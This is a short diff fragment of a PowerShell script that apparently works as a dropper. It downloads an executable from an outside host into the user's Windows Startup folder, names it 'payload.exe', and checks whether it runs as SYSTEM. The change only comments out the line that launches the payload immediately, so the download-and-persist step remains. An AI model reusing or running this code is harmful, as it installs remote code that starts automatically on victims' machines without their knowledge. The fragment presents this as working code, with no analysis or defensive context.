@@ -11,7 +11,7 @@ $startupFolder = Join-Path $env:USERPROFILE "AppData\Roaming\Microsoft\Windows\S
 $payloadUrl = "https://khumoyun.uz/res/win7/main.exe"
 Invoke-WebRequest -Uri $payloadUrl -OutFile (Join-Path $startupFolder "payload.exe") -UseBasicParsing
 
-Start-Process -FilePath "$startupFolder\payload.exe"
+#Start-Process -FilePath "$startupFolder\payload.exe"
 
 if(-Not $($(whoami) -eq "nt authority\system")) {
     $IsSystem = $false
